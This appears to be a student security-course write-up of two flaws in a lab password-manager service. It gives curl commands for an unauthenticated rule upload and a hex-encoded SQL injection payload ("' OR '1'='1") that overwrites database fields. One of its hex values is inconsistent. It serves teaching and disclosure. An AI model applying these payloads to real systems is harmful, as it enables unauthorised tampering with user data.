# Project2

## Vulnerability 1 - Tampering through Unauthenticated Rule Addition
**Steps to Execute**: 
1. Download the `rtest1.bcr` file and place it in the bcpwm-client directory.
2. In the terminal, send the POST request to the cloud server with normal user address ( not administrative email address ) and rtest1.bcr file ( which has very simple rule )
   ```bash
   curl -v -k --noproxy "*" \
     -X POST "https://bcpwm.badlycoded.net/post-rule/init/csel-xsme-f24-csci4271-23.cselabs.umn.edu/student2" \
     -F "file=@/home/student/bcpwm-client/rtest1.bcr"
   ```
   ![2a8b2a50-fe6c-4ca2-abe1-0c2d7ed3cf41](https://github.com/user-attachments/assets/2c5de53f-da15-4990-b9f5-bac5a41edf13)

   You can see that the request was successfully sent.

4. Log in as student2 and enter the `mail` command to check the mail.
   ```bash
   mail
   ```
   ![725298e1-16d4-4c8d-8452-3f177957fec2](https://github.com/user-attachments/assets/53735242-b6c6-4945-b1bf-833d664662bc)

   Then, you can find that the token value has been correctly received in the mail as follows.

  

4. Return to the original bcpwm-client directory and send a confirm request including the token.
   ```bash
   curl -v -k --noproxy "*" "https://bcpwm.badlycoded.net/post-rule/confirm/csel-xsme-f24-csci4271-23.cselabs.umn.edu/aLsSdYYcYQPo"
   ```
   ![095abd18-4029-4b19-9af5-eddb7264d41d](https://github.com/user-attachments/assets/acdad9c5-9f2a-4de4-97a6-e1557fe10a00)

   It can be observed that the rule upload confirm succeeded even when an email from a normal user, rather than an administrative email address, was used.

5. You can find that the rule is saved in `/var/bcpwm/rules`.
   ![e39e9019-036a-498d-9941-76555057dc7a](https://github.com/user-attachments/assets/9e67a674-c7fd-4bf1-bfd2-69452128a328)



**Expected Result**: The system accepts and applies the rule file without requiring administrative validation, allowing the attacker to upload an insecure password generation policy, weakening the site’s overall password security.


## Vulnerability 2 - Overwriting password and token
**Steps to Execute**: 
1. Use "attacker' OR '1'='1" as user. Thus, hexuser would be 61747461636b657227204f52202731273d2731.
2. Use "password" as password. Thus, hexpass would be 0617373776f7264.
3. In the terminal, use the /init_client/<string>/<string> API.
   ```bash
   curl -v -k --noproxy "*" \ "https://bcpwm.badlycoded.net/init_client/61747461636b657227204f52202731273d2731/70617373776f7264"
   ```
   ![ce827149-a431-4d9c-b054-66a1bde47178](https://github.com/user-attachments/assets/74456a59-3142-4c41-ae2e-870e365276d3)
   
   You can see that the request successed.
   
5. Check if the `user`, `password`, and `token` fields in the `user_reg_table` of the database are correctly configured. Navigate to `/var/bcpwm` and enter the command `sqlite3 bcpwm.db`.
6. Search `SELECT * FROM user_reg_table;`.
   
   ![a1eb4373-e35c-4f0b-a232-953a2bca4bca](https://github.com/user-attachments/assets/15ebe650-ed37-4f63-ad2d-d733a668ce98)

   As shown below, at the bottom, you can see that `user = attacker`, `password = OR`, and `token = 1=1`, confirming that the `password` and `token` values have been overwritten.

**Expected Result**: The system allows unvalidated inputs to be directly injected into the database, enabling attackers to overwrite legitimate user data. This compromises the integrity of stored information and may disrupt normal application functionality.


 

